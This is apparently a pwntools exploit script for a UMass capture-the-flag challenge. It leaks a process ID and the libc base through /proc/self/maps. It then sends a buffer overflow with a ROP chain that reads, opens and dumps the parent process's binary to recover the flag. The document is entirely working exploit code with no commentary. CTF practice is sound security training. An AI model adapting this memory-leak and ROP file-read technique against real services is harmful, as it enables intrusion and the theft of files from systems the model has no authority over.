from pwn import *
context.clear(arch='amd64')
# context.log_level='debug'

# p = process('./parent')
# p = remote('localhost', 1337)
p = remote('red40.ctf.umasscybersec.org', 1337)
lib = ELF('libc/libc.so.6')

p.sendlineafter(b'> ', b'2')

while 1:
    p.sendlineafter(b'> ', b'Y')
    if 'WON' in p.recvlineS():
        break

p.sendlineafter(b'> ', b'1')
ppid = int(p.recvlineS().split()[-2])

p.sendlineafter(b'> ', b'5')
p.sendlineafter(b'>', f'/proc/self/maps')

for i in range(10):
    p.recvlineS()

libc_base = int(p.recvlineS().split('-')[0], 16)

for i in range(5):
    p.recvlineS()

writeable = int(p.recvlineS().split('-')[0], 16)

binsh = libc_base + next(lib.search(b'/bin/sh\x00'))
puts = libc_base + lib.sym['puts']
read = libc_base + lib.sym['read']
open = libc_base + lib.sym['open']
write = libc_base + lib.sym['write']

rop = ROP('libc/libc.so.6')
pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = libc_base + rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
ret = libc_base + rop.find_gadget(['ret'])[0]

# warn
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'>', b'AA')

payload = b'A'*48
# read filename
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(writeable)
payload += p64(pop_rdx_rbx)
payload += p64(0x100)
payload += p64(0)
payload += p64(read)

# open file
payload += p64(pop_rdi)
payload += p64(writeable)
payload += p64(pop_rsi)
payload += p64(os.O_RDONLY)
payload += p64(open)

# read file
payload += p64(pop_rdi)
payload += p64(5)
payload += p64(pop_rsi)
payload += p64(writeable)
payload += p64(pop_rdx_rbx)
payload += p64(0x5000)
payload += p64(0)
payload += p64(read)

# print
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(writeable)
payload += p64(pop_rdx_rbx)
payload += p64(0x5000)
payload += p64(0)
payload += p64(write)

p.sendlineafter(b'> ', payload)
context.log_level='debug'
p.send(f'/proc/{ppid}/exe\x00')

data = p.recvn(0x5000)
idx = data.index(b'UMASS')
print(data[idx:idx+0x100])

p.interactive()